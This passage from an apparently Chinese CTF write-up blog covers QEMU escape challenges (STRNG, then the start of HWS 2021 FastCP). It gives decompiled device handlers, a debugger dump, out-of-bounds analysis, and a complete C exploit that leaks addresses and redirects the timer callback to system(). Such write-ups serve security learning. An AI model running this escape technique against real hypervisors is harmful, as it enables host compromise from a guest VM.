function_">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int64_t</span> ms_4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint32_t</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> &amp;&amp; (opaque-&gt;addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = opaque-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">3</span>] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[v5] = val;</span><br><span class="line">            <span class="keyword">if</span> ( opaque-&gt;flag )</span><br><span class="line">            &#123;</span><br><span class="line">              ms_4 = qemu_clock_get_ms_4(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">              timer_mod(&amp;opaque-&gt;strng_timer, ms_4 + <span class="number">100</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          srand(val);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过对上面四个函数的观察，我们可以发现起都可以通过对<code>regs</code>数组进行越界操作，且<code>strng_pmio_write</code>函数中存在<code>timer</code>的函数调用。因此我们可以通过<code>regs</code>数组的越界操作来实现部分地址的读写操作<br>我们首先来看<code>STRNGState</code>结构体（内容来自<code>sky123</code>师傅的博客）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(STRNGState*)<span class="number">0x5555582a59d0</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  pdev = &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  mmio = &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  pmio = &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  addr = <span class="number">276</span>, </span><br><span class="line">  flag = <span class="number">1</span>, </span><br><span class="line">  regs = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1818321784</span>, <span class="number">99</span>, <span class="number">0</span> &lt;repeats <span class="number">58</span> times&gt;&#125;, </span><br><span class="line">  strng_timer = &#123;</span><br><span class="line">    expire_time = <span class="number">-1</span>, </span><br><span class="line">    timer_list = <span class="number">0x555556a71860</span>, </span><br><span class="line">    cb = <span class="number">0x5555557eec8e</span> &lt;strng_timer&gt;, </span><br><span class="line">    opaque = <span class="number">0x5555582a59d0</span>, </span><br><span class="line">    next = <span class="number">0x0</span>, </span><br><span class="line">    scale = <span class="number">1000000</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>opaque</code>中存放的是<code>STRNGState</code>结构体的地址，而<code>cb</code>则存放着<code>qemu-system</code>的地址，于是我们可以通过<code>regs</code>的溢出来进行泄露<br>接下来就是要考虑怎么劫持程序流。注意到前面<code>strng_pmio_write</code>函数中存在<code>timer</code>的函数调用，其<code>timer_mod</code> 函数会将该定时任务时间设置为 <code>ms_4 + 100</code> ，并且将 <code>opaque-&gt;strng_timer</code> 添加到定时任务。于是我们可以将<code>STRNGState</code>结构体中的<code>cb</code>改为<code>system@plt</code>的地址，然后将<code>opaque</code>改为函数参数的地址，即可实现任意函数的执行</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *) mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span> *) mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_mem = <span class="number">0x000000000000c050</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    outl(value, pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> inl(pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_abread</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    pmio_write(<span class="number">0</span>, offset &lt;&lt; <span class="number">2</span>);  <span class="comment">// 设置 opaque-&gt;addr</span></span><br><span class="line">    <span class="type">uint64_t</span> val = pmio_read(<span class="number">4</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>, (offset + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> val | (<span class="number">1ULL</span> * pmio_read(<span class="number">4</span>) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_abwrite</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    pmio_write(<span class="number">0</span>, offset &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>, value &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>, (offset + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>, value &gt;&gt; <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[] = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cmd); i += <span class="number">4</span>) &#123;</span><br><span class="line">        mmio_write(<span class="number">4</span> + i / <span class="number">4</span>, *(<span class="type">uint32_t</span> *) &amp;cmd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to set io permission.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> arg_addr = pmio_abread(<span class="number">70</span>) + <span class="number">0xb08</span>;</span><br><span class="line">    <span class="type">size_t</span> elf_base = pmio_abread(<span class="number">68</span>) - <span class="number">0x29ac8e</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] arg addr: %p\n&quot;</span>, arg_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] elf base: %p\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] STRNGState addr: %p\n&quot;</span>, arg_addr - <span class="number">0xb08</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> system_plt = elf_base + <span class="number">0x200d50</span>;</span><br><span class="line"></span><br><span class="line">    pmio_abwrite(<span class="number">70</span>, arg_addr);</span><br><span class="line">    pmio_abwrite(<span class="number">68</span>, system_plt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HWS-2021-FastCP"><a href="#HWS-2021-FastCP" class="headerlink" title="[HWS 2021] FastCP"></a>[HWS 2021] FastCP</h2><h3 id="关键源码"><a href="#关键源码" class="headerlink" title="关键源码"></a>关键源码</h3><h4 id="fastcp-mmio-read"><a href="#fastcp-mmio-read" class="headerlink" title="fastcp_mmio_read"></a>fastcp_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">fastcp_mmio_read</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">8</span> &amp;&amp; addr &lt;= <span class="number">0x1F</span> || addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_src;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;handling;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;cp_state.cmd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fastcp-mmio-write"><a href="#fastcp-mmio-write" class="headerlink" title="fastcp_mmio_write"></a>fastcp_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">fastcp_mmio_write</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (size == <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &amp;&amp; addr &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">        opaque-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;cp_state.cmd = val;</span><br><span class="line">        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">        timer_mod(&amp;opaque-&gt;cp_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;cp_state.CP_list_src = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fastcp-cp-timer"><a href="#fastcp-cp-timer" class="headerlink" title="fastcp_cp_timer"></a>fastcp_cp_timer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">fastcp_cp_timer</span><span class="params">(FastCPState *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint64_t</span> CP_list_cnt; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">uint64_t</span> v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">uint64_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint64_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">uint64_t</span> v8; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  FastCP_CP_INFO cp_info; <span class="comment">// [rsp+0h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;cp_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(cp_info));</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);<span class="comment">// 从opaque-&gt;cp_list_src中读取0x18字节数据到cp_info中</span></span><br><span class="line">        <span class="keyword">if</span> ( cp_info.CP_cnt &lt;= <span class="number">0x1000</span> )</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            msi_notify(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;                          <span class="comment">// handling = 0</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( CP_list_cnt &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">3</span> * v8++;</span><br><span class="line">          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !CP_list_cnt )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">          v6 = cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">          opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v12 &gt; <span class="number">0x1000</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">          ++v4;</span><br><span class="line">          v3 += <span class="number">24LL</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt;= v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;cp_state.cmd = <span class="number">0LL</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">  opaque-&gt;handling = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以看到<code>read</code>函数的功能是分别获取<code>cp_list_src</code>、<code>cp_list_cnt</code>、<code>cmd</code>的值，而<code>write</code>函数则是设置这<code>3</code>个参数，其中在设置<code>cmd</code>这个参数时还会调用<code>timer_mod</code>函数。我们把重点放在<code>fastcp_cp_timer</code>函数中。可以看到该函数会按照<code>cmd</code>的值的不同进行不同的操作。当<code>cmd</code>的值为<code>1</code>时，我们重点看下面这段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v9 = <span class="number">3</span> * v8++;</span><br><span class="line">cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span 